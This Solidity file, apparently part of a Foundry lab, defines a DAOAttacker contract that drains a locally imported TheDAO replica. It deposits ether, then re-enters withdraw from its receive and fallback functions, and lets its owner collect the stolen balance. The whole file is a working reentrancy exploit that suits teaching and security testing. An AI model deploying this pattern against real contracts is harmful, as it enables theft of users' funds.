// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "./TheDAO.sol";
import "forge-std/console.sol";

contract DAOAttacker {
    TheDAO public dao;
    address public owner;
    
    constructor(address _daoAddress) {
        dao = TheDAO(_daoAddress);
        owner = msg.sender;
    }
    
    function attack() public payable {
        require(msg.value >= 1 ether, "Need at least 1 ether to attack");
        dao.deposit{value: msg.value}();
        dao.withdraw(msg.value);
    }
    
    receive() external payable {
        _attack();
    }
    
    fallback() external payable {
        _attack();
    }
    
    function _attack() internal {
        if (address(dao).balance >= 1 ether) {
            console.log("[REENTRANCY] Attacking again! DAO balance:", address(dao).balance);
            dao.withdraw(1 ether);
        }
    }
    
    function withdraw() public {
        require(msg.sender == owner, "Only owner");
        payable(owner).transfer(address(this).balance);
    }
    
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}

